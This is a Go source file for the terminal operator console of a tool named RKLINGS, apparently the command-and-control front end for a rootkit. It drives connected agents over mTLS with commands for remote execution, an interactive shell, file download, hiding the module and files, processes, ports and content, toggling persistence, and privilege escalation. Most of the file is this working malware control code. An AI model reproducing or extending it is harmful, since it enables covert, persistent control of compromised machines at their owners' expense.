package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"charm.land/bubbles/v2/textinput"
	"charm.land/bubbles/v2/viewport"
	tea "charm.land/bubbletea/v2"
	"charm.land/lipgloss/v2"
)

var (
	tuiMu      sync.RWMutex
	tuiProgram *tea.Program
)

var (
	purple = lipgloss.Color("#7C3AED")
	green  = lipgloss.Color("#22C55E")
	red    = lipgloss.Color("#EF4444")
	muted  = lipgloss.Color("#8B859E")

	titleStyle = lipgloss.NewStyle().Bold(true).Foreground(purple)
	dimStyle   = lipgloss.NewStyle().Foreground(muted)
	okStyle    = lipgloss.NewStyle().Foreground(green)
	errStyle   = lipgloss.NewStyle().Foreground(red)
	labelStyle = lipgloss.NewStyle().Bold(true).Foreground(muted)
)

type operatorEvent struct{ text string }
type shellFinished struct{ err error }

type commandResult struct {
	command string
	output  string
	err     error
	elapsed time.Duration
}

type consoleModel struct {
	input      textinput.Model
	output     viewport.Model
	lines      []string
	history    []string
	historyPos int
	width      int
	height     int
	busy       bool
}

var completions = []string{
	"agents", "use ", "ping", "status", "info", "exec ", "shell", "download ",
	"hide module", "hide file ", "hide pid ", "hide port ", "hide content ",
	"unhide module", "unhide file ", "unhide pid ", "unhide port ", "unhide content ",
	"persist", "unpersist", "escalate ", "clear", "help", "quit",
}

func newConsole() consoleModel {
	in := textinput.New()
	in.Prompt = "> "
	in.Placeholder = "type a command"
	in.CharLimit = 4096
	in.ShowSuggestions = true
	in.SetSuggestions(completions)
	in.SetWidth(72)
	in.Focus()
	out := viewport.New()
	out.SoftWrap, out.FillHeight = true, true
	m := consoleModel{input: in, output: out, historyPos: -1}
	m.lines = []string{"Ready. Type " + titleStyle.Render("help") + " for commands."}
	m.syncOutput()
	return m
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

func (m consoleModel) Init() tea.Cmd { return textinput.Blink }

func (m consoleModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width, m.height = msg.Width, msg.Height
		m.resize()
	case operatorEvent:
		m.refreshSuggestions()
		m.append(okStyle.Render("[+] ") + msg.text)
	case commandResult:
		m.busy = false
		m.append(formatResult(msg))
	case shellFinished:
		m.busy = false
		if msg.err != nil {
			m.append(errStyle.Render("shell  ") + msg.err.Error())
		} else {
			m.append(okStyle.Render("shell closed"))
		}
	case tea.KeyPressMsg:
		switch msg.String() {
		case "ctrl+c", "ctrl+d":
			return m, tea.Quit
		case "ctrl+l":
			m.lines = nil
			m.syncOutput()
			return m, nil
		case "enter":
			return m.submit()
		case "tab":
			m.complete()
			return m, nil
		case "up":
			m.previousHistory()
			return m, nil
		case "down":
			m.nextHistory()
			return m, nil
		case "pgup":
			m.output.PageUp()
			return m, nil
		case "pgdown":
			m.output.PageDown()
			return m, nil
		}
	}
	var cmd tea.Cmd
	m.input, cmd = m.input.Update(msg)
	return m, cmd
}

func (m consoleModel) View() tea.View {
	sessions, active, _ := agents.snapshot()
	status := errStyle.Render("[-] NO TARGET")
	if active != "" {
		status = okStyle.Render("[+] ") + active
	}
	if len(sessions) > 1 {
		status += dimStyle.Render(fmt.Sprintf("  %d agents", len(sessions)))
	}
	if m.busy {
		status += dimStyle.Render("  RUNNING")
	}
	header := titleStyle.Render("RKLINGS") + "  " + status
	endpoints := dimStyle.Render("mTLS " + envOr("RKLINGS_LISTEN_ADDR", ":8443") +
		"  |  web http://" + envOr("RKLINGS_WEB_ADDR", "127.0.0.1:8080"))
	divider := dimStyle.Render(strings.Repeat("-", max(1, m.width)))
	prompt := "operator > "
	if active != "" {
		prompt = active + " > "
	}
	m.input.Prompt = titleStyle.Render(prompt)
	footer := m.input.View() + "\n" + dimStyle.Render("tab complete | up/down history | pgup/pgdn scroll | ctrl+l clear | ctrl+c quit")
	v := tea.NewView(header + "\n" + endpoints + "\n" + divider + "\n" + m.output.View() + "\n" + divider + "\n" + footer)
	v.AltScreen = true
	v.WindowTitle = "rklings operator"
	v.Cursor = m.input.Cursor()
	return v
}

func (m *consoleModel) resize() {
	width := max(20, m.width)
	m.output.SetWidth(width)
	m.output.SetHeight(max(4, m.height-7))
	m.input.SetWidth(width)
	m.syncOutput()
}

func (m *consoleModel) append(line string) {
	m.lines = append(m.lines, line)
	if len(m.lines) > 500 {
		m.lines = m.lines[len(m.lines)-500:]
	}
	m.syncOutput()
	m.output.GotoBottom()
}

func (m *consoleModel) syncOutput() { m.output.SetContent(strings.Join(m.lines, "\n")) }

func (m *consoleModel) refreshSuggestions() {
	sessions, _, _ := agents.snapshot()
	m.input.SetSuggestions(suggestionsFor(sessions))
}

func suggestionsFor(sessions []*agentSession) []string {
	suggestions := append([]string(nil), completions...)
	for _, session := range sessions {
		suggestions = append(suggestions, "use "+session.id)
	}
	return suggestions
}

func (m *consoleModel) complete() {
	prefix := strings.ToLower(m.input.Value())
	sessions, _, _ := agents.snapshot()
	var matches []string
	for _, suggestion := range suggestionsFor(sessions) {
		if strings.HasPrefix(strings.ToLower(suggestion), prefix) {
			matches = append(matches, suggestion)
		}
	}
	if len(matches) == 0 {
		return
	}
	if len(matches) == 1 {
		m.input.SetValue(matches[0])
		m.input.CursorEnd()
		return
	}
	common := commonPrefix(matches)
	if len(common) > len(m.input.Value()) {
		m.input.SetValue(common)
		m.input.CursorEnd()
	}
	m.append(dimStyle.Render(strings.Join(matches, "  ")))
}

func commonPrefix(values []string) string {
	if len(values) == 0 {
		return ""
	}
	prefix := values[0]
	for _, value := range values[1:] {
		for !strings.HasPrefix(strings.ToLower(value), strings.ToLower(prefix)) {
			prefix = prefix[:len(prefix)-1]
			if prefix == "" {
				return ""
			}
		}
	}
	return prefix
}

func (m consoleModel) submit() (tea.Model, tea.Cmd) {
	line := strings.TrimSpace(m.input.Value())
	if line == "" {
		return m, nil
	}
	m.input.Reset()
	m.history = append(m.history, line)
	m.historyPos = len(m.history)
	m.append(titleStyle.Render("> ") + line)
	parts := strings.SplitN(line, " ", 2)
	name := strings.ToLower(parts[0])
	arg := ""
	if len(parts) == 2 {
		arg = strings.TrimSpace(parts[1])
	}
	switch name {
	case "quit", "exit":
		return m, tea.Quit
	case "clear":
		m.lines = nil
		m.syncOutput()
		return m, nil
	case "help", "?":
		m.append(helpText())
		return m, nil
	case "agents":
		m.append(agentList())
		return m, nil
	case "use":
		if arg == "" {
			m.append(errStyle.Render("error  usage: use <agent>"))
		} else if err := agents.selectAgent(arg); err != nil {
			m.append(errStyle.Render("error  ") + err.Error())
		} else {
			m.append(okStyle.Render("active  ") + arg)
		}
		return m, nil
	case "shell":
		if arg != "" {
			m.append(errStyle.Render("error  usage: shell"))
			return m, nil
		}
		m.busy = true
		return m, tea.Exec(&remoteShell{}, func(err error) tea.Msg {
			return shellFinished{err: err}
		})
	}
	command, err := protocolCommand(name, arg)
	if err != nil {
		m.append(errStyle.Render("error  ") + err.Error())
		return m, nil
	}
	if m.busy {
		m.append(errStyle.Render("error  command already running"))
		return m, nil
	}
	m.busy = true
	return m, runCommand(command)
}

func protocolCommand(name, arg string) (string, error) {
	switch name {
	case "ping", "status", "info", "persist", "unpersist":
		if arg != "" {
			return "", fmt.Errorf("%s takes no arguments", name)
		}
		return strings.ToUpper(name), nil
	case "exec", "download":
		if arg == "" {
			return "", fmt.Errorf("usage: %s <value>", name)
		}
		verb := strings.ToUpper(name)
		if name == "exec" {
			verb = "SHELL"
		}
		return verb + " " + arg, nil
	case "hide", "unhide":
		fields := strings.SplitN(arg, " ", 2)
		if len(fields) != 2 || fields[1] == "" {
			return "", fmt.Errorf("usage: %s <file|pid|port|content> <value>", name)
		}
		return strings.ToUpper(name) + " " + strings.ToUpper(fields[0]) + " " + fields[1], nil
	case "escalate":
		command := "ESCALATE"
		if arg != "" {
			command += " " + arg
		}
		return command, nil
	default:
		return "", fmt.Errorf("unknown command %q", name)
	}
}

func runCommand(command string) tea.Cmd {
	return func() tea.Msg {
		started := time.Now()
		var output string
		var err error
		if remotePath, ok := strings.CutPrefix(command, "DOWNLOAD "); ok {
			output, err = downloadToDisk(remotePath)
		} else {
			output, err = sendToAgent(command)
		}
		return commandResult{command: command, output: output, err: err, elapsed: time.Since(started)}
	}
}

func formatResult(result commandResult) string {
	timing := dimStyle.Render(fmt.Sprintf("  %dms", result.elapsed.Milliseconds()))
	if result.err != nil {
		return errStyle.Render("[-] ") + result.err.Error()
	}
	output := strings.TrimSpace(result.output)
	switch {
	case result.command == "PING":
		return okStyle.Render("[+] online") + timing
	case result.command == "STATUS":
		return formatStatus(output) + timing
	case result.command == "INFO":
		return formatInfo(output) + timing
	case output == "" || output == "OK":
		return okStyle.Render("[+] done") + timing
	default:
		return output + timing
	}
}

func formatStatus(output string) string {
	values := make(map[string]string)
	for _, field := range strings.Fields(output) {
		key, value, ok := strings.Cut(field, "=")
		if ok {
			values[key] = value
		}
	}
	if values["PID"] == "" || values["UID"] == "" {
		return output
	}
	identity := "uid " + values["UID"]
	if values["UID"] == "0" {
		identity = "root"
	}
	return labelStyle.Render("[*] agent") + "  pid=" + values["PID"] + "  uid=" + identity
}

func formatInfo(output string) string {
	payload := strings.TrimSpace(strings.TrimPrefix(output, "INFO "))
	var info agentInfo
	if json.Unmarshal([]byte(payload), &info) != nil {
		return output
	}
	onOff := func(value bool) string {
		if value {
			return okStyle.Render("on")
		}
		return dimStyle.Render("off")
	}
	lines := []string{
		labelStyle.Render("[*] system") + "  host=" + info.Hostname + "  kernel=" + info.Kernel + "  arch=" + info.Arch,
		labelStyle.Render("[*] agent ") + fmt.Sprintf("  pid=%d  uid=%d", info.PID, info.UID),
		labelStyle.Render("[+] module") + "  hidden=" + onOff(info.ModuleHidden),
		labelStyle.Render("[+] persistence") + "  enabled=" + onOff(info.Persisted),
	}
	for _, kind := range []string{"file", "content", "pid", "port"} {
		values := info.Hidden[kind]
		if len(values) > 0 {
			lines = append(lines, labelStyle.Render("[+] hidden")+"  "+kind+"="+strings.Join(values, ","))
		}
	}
	return strings.Join(lines, "\n")
}

func agentList() string {
	sessions, active, _ := agents.snapshot()
	if len(sessions) == 0 {
		return dimStyle.Render("No connected agents.")
	}
	lines := make([]string, 0, len(sessions))
	for _, session := range sessions {
		marker := "  "
		if session.id == active {
			marker = okStyle.Render("[+] ")
		}
		lines = append(lines, marker+session.id+dimStyle.Render("  "+session.peer))
	}
	return strings.Join(lines, "\n")
}

func (m *consoleModel) previousHistory() {
	if len(m.history) == 0 {
		return
	}
	if m.historyPos > 0 {
		m.historyPos--
	}
	m.input.SetValue(m.history[m.historyPos])
	m.input.CursorEnd()
}

func (m *consoleModel) nextHistory() {
	if m.historyPos < 0 || m.historyPos >= len(m.history) {
		return
	}
	m.historyPos++
	if m.historyPos == len(m.history) {
		m.input.Reset()
		return
	}
	m.input.SetValue(m.history[m.historyPos])
	m.input.CursorEnd()
}

func helpText() string {
	return strings.Join([]string{
		titleStyle.Render("TARGETS"),
		"agents               list connected agents",
		"use <agent>          select command target",
		"", titleStyle.Render("OPERATIONS"),
		"ping                 verify connectivity",
		"status | info        inspect the agent",
		"exec <command>       stdout, stderr, and exit code",
		"shell                open a persistent interactive PTY",
		"download <path>      save a remote file locally",
		"hide <type> <value>  conceal a target",
		"unhide <type> <value>  restore the same value",
		"persist | unpersist  control persistence",
		"escalate [pid]       elevate credentials",
		"clear                clear this console",
		"quit                 stop the operator",
	}, "\n")
}

func startTUI(listener net.Listener) {
	program := tea.NewProgram(newConsole())
	tuiMu.Lock()
	tuiProgram = program
	tuiMu.Unlock()
	if _, err := program.Run(); err != nil {
		fmt.Printf("operator console: %v\n", err)
	}
	_ = listener.Close()
}

func notifyTUI(text string) {
	tuiMu.RLock()
	program := tuiProgram
	tuiMu.RUnlock()
	if program != nil {
		program.Send(operatorEvent{text: text})
	}
}
